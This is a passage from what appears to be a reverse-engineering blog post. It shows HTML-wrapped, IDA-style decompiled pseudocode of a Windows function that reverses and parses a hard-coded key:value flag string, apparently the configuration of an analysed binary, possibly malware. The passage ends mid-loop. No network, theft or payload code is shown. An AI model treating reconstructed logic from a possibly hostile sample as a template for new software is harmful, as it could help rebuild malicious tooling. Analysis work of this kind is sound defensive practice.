class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br></pre></td><td class="code"><pre><span class="line">#sub_140008750函数</span><br><span class="line">int sub_140008750()</span><br><span class="line">&#123;</span><br><span class="line">  _UNKNOWN **v0; // rax</span><br><span class="line">  __int64 v1; // rbx</span><br><span class="line">  int v2; // eax</span><br><span class="line">  int v3; // r9d</span><br><span class="line">  __int64 v4; // rdx</span><br><span class="line">  int v5; // r10d</span><br><span class="line">  __int64 i; // r8</span><br><span class="line">  int v7; // ecx</span><br><span class="line">  __int64 v8; // rbx</span><br><span class="line">  int v9; // eax</span><br><span class="line">  int v10; // r9d</span><br><span class="line">  __int64 v11; // rdx</span><br><span class="line">  int v12; // r10d</span><br><span class="line">  __int64 j; // r8</span><br><span class="line">  int v14; // ecx</span><br><span class="line">  __int64 v15; // rbx</span><br><span class="line">  int v16; // eax</span><br><span class="line">  int v17; // r9d</span><br><span class="line">  __int64 v18; // rdx</span><br><span class="line">  int v19; // r10d</span><br><span class="line">  __int64 k; // r8</span><br><span class="line">  int v21; // ecx</span><br><span class="line">  __int64 v22; // rbx</span><br><span class="line">  int v23; // eax</span><br><span class="line">  int v24; // r9d</span><br><span class="line">  __int64 v25; // rdx</span><br><span class="line">  int v26; // r10d</span><br><span class="line">  __int64 m; // r8</span><br><span class="line">  int v28; // ecx</span><br><span class="line">  __int64 v29; // rbx</span><br><span class="line">  int v30; // eax</span><br><span class="line">  int v31; // r9d</span><br><span class="line">  __int64 v32; // rdx</span><br><span class="line">  int v33; // r10d</span><br><span class="line">  __int64 n; // r8</span><br><span class="line">  int v35; // ecx</span><br><span class="line">  __int64 v36; // rbx</span><br><span class="line">  int v37; // eax</span><br><span class="line">  int v38; // r9d</span><br><span class="line">  __int64 v39; // rdx</span><br><span class="line">  int v40; // r10d</span><br><span class="line">  __int64 ii; // r8</span><br><span class="line">  int v42; // ecx</span><br><span class="line">  __int64 v43; // rbx</span><br><span class="line">  int v44; // eax</span><br><span class="line">  int v45; // r9d</span><br><span class="line">  __int64 v46; // rdx</span><br><span class="line">  int v47; // r10d</span><br><span class="line">  __int64 jj; // r8</span><br><span class="line">  int v49; // ecx</span><br><span class="line">  __int64 v50; // rbx</span><br><span class="line">  int v51; // eax</span><br><span class="line">  int v52; // r9d</span><br><span class="line">  __int64 v53; // rdx</span><br><span class="line">  int v54; // r10d</span><br><span class="line">  __int64 kk; // r8</span><br><span class="line">  int v56; // ecx</span><br><span class="line">  __int64 v57; // rbx</span><br><span class="line">  int v58; // eax</span><br><span class="line">  int v59; // r9d</span><br><span class="line">  __int64 v60; // rdx</span><br><span class="line">  int v61; // r10d</span><br><span class="line">  __int64 mm; // r8</span><br><span class="line">  int v63; // ecx</span><br><span class="line">  __int64 v64; // rbx</span><br><span class="line">  int v65; // eax</span><br><span class="line">  int v66; // r9d</span><br><span class="line">  __int64 v67; // rdx</span><br><span class="line">  int v68; // r10d</span><br><span class="line">  __int64 nn; // r8</span><br><span class="line">  int v70; // ecx</span><br><span class="line">  __int64 v71; // rbx</span><br><span class="line">  int v72; // eax</span><br><span class="line">  int v73; // r9d</span><br><span class="line">  __int64 v74; // rdx</span><br><span class="line">  int v75; // r10d</span><br><span class="line">  __int64 i1; // r8</span><br><span class="line">  int v77; // ecx</span><br><span class="line">  __int64 v78; // rbx</span><br><span class="line">  int v79; // eax</span><br><span class="line">  int v80; // r9d</span><br><span class="line">  __int64 v81; // rdx</span><br><span class="line">  int v82; // r10d</span><br><span class="line">  __int64 i2; // r8</span><br><span class="line">  __int64 v84; // rbx</span><br><span class="line">  int v85; // eax</span><br><span class="line">  int v86; // r9d</span><br><span class="line">  __int64 v87; // rdx</span><br><span class="line">  int v88; // r10d</span><br><span class="line">  __int64 i3; // r8</span><br><span class="line">  int v90; // ecx</span><br><span class="line">  int v91; // ecx</span><br><span class="line">  __int64 v92; // rbx</span><br><span class="line">  int v93; // r9d</span><br><span class="line">  __int64 v94; // rdx</span><br><span class="line">  __int64 v95; // rsi</span><br><span class="line">  int v96; // r10d</span><br><span class="line">  __int64 v97; // r8</span><br><span class="line">  int v98; // ecx</span><br><span class="line">  _UNKNOWN *retaddr; // [rsp+68h] [rbp+0h] BYREF</span><br><span class="line">  DWORD cbData; // [rsp+70h] [rbp+8h] BYREF</span><br><span class="line">  DWORD Type; // [rsp+78h] [rbp+10h] BYREF</span><br><span class="line">  HKEY hKey; // [rsp+80h] [rbp+18h] BYREF</span><br><span class="line"></span><br><span class="line">  v0 = &amp;retaddr;</span><br><span class="line">  if ( !byte_140060708 )</span><br><span class="line">  &#123;</span><br><span class="line">    byte_140060708 = 1;</span><br><span class="line">    wcsrev(a0Db0Lk0Hs0Ld0L);                    // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">    memset(&amp;Src, 0, 0x12A0u);</span><br><span class="line">    sub_140008620(L&quot;p1:&quot;, &amp;Source);</span><br><span class="line">    sub_140008620(L&quot;o1:&quot;, &amp;Source__1);</span><br><span class="line">    v1 = lstrlenW(a0Db0Lk0Hs0Ld0L);             // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">    v2 = lstrlenW(L&quot;t1:&quot;);</span><br><span class="line">    v3 = 0;</span><br><span class="line">    v4 = 0;</span><br><span class="line">    if ( (int)v1 &gt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = 0;</span><br><span class="line">        for ( i = 0; i &lt; v2; ++v5 )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( a0Db0Lk0Hs0Ld0L[v4 + i] != aT1[i] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">            break;</span><br><span class="line">          ++i;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( v5 == v2 )</span><br><span class="line">        &#123;</span><br><span class="line">          v4 += v2;</span><br><span class="line">          v3 += v2;</span><br><span class="line">          if ( v4 &lt; v1 )</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_10:</span><br><span class="line">        ++v4;</span><br><span class="line">        ++v3;</span><br><span class="line">        if ( v4 &gt;= v1 )</span><br><span class="line">          goto LABEL_15;</span><br><span class="line">      &#125;</span><br><span class="line">      // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">      while ( a0Db0Lk0Hs0Ld0L[v4] != 124 )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v4;</span><br><span class="line">        ++v3;</span><br><span class="line">        if ( v4 &gt;= v1 )</span><br><span class="line">          goto LABEL_10;</span><br><span class="line">      &#125;</span><br><span class="line">      v7 = dword_14005F6A8;</span><br><span class="line">      if ( a0Db0Lk0Hs0Ld0L[v3 - 1] == 49 )      // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">        v7 = 1;</span><br><span class="line">      dword_14005F6A8 = v7;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_15:</span><br><span class="line">    sub_140008620(L&quot;p2:&quot;, &amp;Source_);</span><br><span class="line">    sub_140008620(L&quot;o2:&quot;, &amp;Source__0);</span><br><span class="line">    v8 = lstrlenW(a0Db0Lk0Hs0Ld0L);             // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">    v9 = lstrlenW(L&quot;t2:&quot;);</span><br><span class="line">    v10 = 0;</span><br><span class="line">    v11 = 0;</span><br><span class="line">    if ( (int)v8 &gt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v12 = 0;</span><br><span class="line">        for ( j = 0; j &lt; v9; ++v12 )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( a0Db0Lk0Hs0Ld0L[v11 + j] != aT2[j] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">            break;</span><br><span class="line">          ++j;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( v12 == v9 )</span><br><span class="line">        &#123;</span><br><span class="line">          v11 += v9;</span><br><span class="line">          v10 += v9;</span><br><span class="line">          if ( v11 &lt; v8 )</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_23:</span><br><span class="line">        ++v11;</span><br><span class="line">        ++v10;</span><br><span class="line">        if ( v11 &gt;= v8 )</span><br><span class="line">          goto LABEL_28;</span><br><span class="line">      &#125;</span><br><span class="line">      // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">      while ( a0Db0Lk0Hs0Ld0L[v11] != 124 )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v11;</span><br><span class="line">        ++v10;</span><br><span class="line">        if ( v11 &gt;= v8 )</span><br><span class="line">          goto LABEL_23;</span><br><span class="line">      &#125;</span><br><span class="line">      v14 = dword_14005F8E8;</span><br><span class="line">      if ( a0Db0Lk0Hs0Ld0L[v10 - 1] == 49 )     // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">        v14 = 1;</span><br><span class="line">      dword_14005F8E8 = v14;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_28:</span><br><span class="line">    sub_140008620(L&quot;p3:&quot;, &amp;Source__2);</span><br><span class="line">    sub_140008620(L&quot;o3:&quot;, &amp;Source__3);</span><br><span class="line">    v15 = lstrlenW(a0Db0Lk0Hs0Ld0L);            // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">    v16 = lstrlenW(L&quot;t3:&quot;);</span><br><span class="line">    v17 = 0;</span><br><span class="line">    v18 = 0;</span><br><span class="line">    if ( (int)v15 &gt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v19 = 0;</span><br><span class="line">        for ( k = 0; k &lt; v16; ++v19 )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( a0Db0Lk0Hs0Ld0L[v18 + k] != aT3[k] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">            break;</span><br><span class="line">          ++k;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( v19 == v16 )</span><br><span class="line">        &#123;</span><br><span class="line">          v18 += v16;</span><br><span class="line">          v17 += v16;</span><br><span class="line">          if ( v18 &lt; v15 )</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_36:</span><br><span class="line">        ++v18;</span><br><span class="line">        ++v17;</span><br><span class="line">        if ( v18 &gt;= v15 )</span><br><span class="line">          goto LABEL_41;</span><br><span class="line">      &#125;</span><br><span class="line">      // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">      while ( a0Db0Lk0Hs0Ld0L[v18] != 124 )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v18;</span><br><span class="line">        ++v17;</span><br><span class="line">        if ( v18 &gt;= v15 )</span><br><span class="line">          goto LABEL_36;</span><br><span class="line">      &#125;</span><br><span class="line">      v21 = dword_14005FB28;</span><br><span class="line">      if ( a0Db0Lk0Hs0Ld0L[v17 - 1] == 49 )     // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">        v21 = 1;</span><br><span class="line">      dword_14005FB28 = v21;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_41:</span><br><span class="line">    sub_140008620(L&quot;dd:&quot;, &amp;Destination__0);</span><br><span class="line">    sub_140008620(L&quot;cl:&quot;, &amp;Destination__1);</span><br><span class="line">    sub_140008620(L&quot;fz:&quot;, &amp;unk_14005FBA4);</span><br><span class="line">    sub_140008620(L&quot;bb:&quot;, &amp;unk_14005FC08);</span><br><span class="line">    sub_140008620(L&quot;bz:&quot;, &amp;unk_14005FC6C);</span><br><span class="line">    v22 = lstrlenW(a0Db0Lk0Hs0Ld0L);            // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">    v23 = lstrlenW(L&quot;jp:&quot;);</span><br><span class="line">    v24 = 0;</span><br><span class="line">    v25 = 0;</span><br><span class="line">    if ( (int)v22 &gt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v26 = 0;</span><br><span class="line">        for ( m = 0; m &lt; v23; ++v26 )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( a0Db0Lk0Hs0Ld0L[v25 + m] != aJp[m] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot;</span><br><span class="line">            break;</span><br><span class="line">          ++m;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( v26 == v23 )</span><br><span class="line">        &#123;</span><br><span class="line">          v25 += v23;</span><br><span class="line">          v24 += v23;</span><br><span class="line">          if ( v25 &lt; v22 )</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_49:</span><br><span class="line">        ++v25;</span><br><span class="line">        